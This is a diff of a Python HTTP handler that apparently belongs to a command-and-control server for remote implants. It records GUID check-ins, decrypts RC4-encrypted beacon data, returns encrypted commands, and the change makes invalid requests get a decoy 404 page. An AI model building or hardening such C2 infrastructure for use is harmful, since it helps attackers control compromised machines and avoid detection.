@@ -33,26 +33,29 @@ def HTTPDFactory(config):
         def do_POST(self):
             guid = ""
             try:
-                guid = self.path.split('?', 1)[1]
+                guid = Utils.validate_guid(self.path.split('?', 1)[1])
             except:
                 Log.log_error("Invalid request no GUID", self.path)
                 self.return_data()
                 return
                 
-            self.db.update_checkin(guid)
-        
-            length = int(self.headers.getheader("Content-Length"))
-            data = self.rfile.read(length)
-            try:
-                data = self.rc4.crypt(base64.b64decode(data))
-            except:
-                Log.log_error("Invalid base64 data received", self.path)
-                self.return_data()
-                return 
+            if not guid == None:
+                self.db.update_checkin(guid)
             
-            parser = HTTPDParser(config)
-            self.output = base64.b64encode(self.rc4.crypt(parser.parse_cmd(guid, data)))
-            
+                length = int(self.headers.getheader("Content-Length"))
+                data = self.rfile.read(length)
+                try:
+                    data = self.rc4.crypt(base64.b64decode(data))
+                except:
+                    Log.log_error("Invalid base64 data received", self.path)
+                    self.return_data()
+                    return 
+                
+                parser = HTTPDParser(config)
+                self.output = base64.b64encode(self.rc4.crypt(parser.parse_cmd(guid, data)))
+            else:
+                self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
+                
             self.return_data()
             
         def do_GET(self):
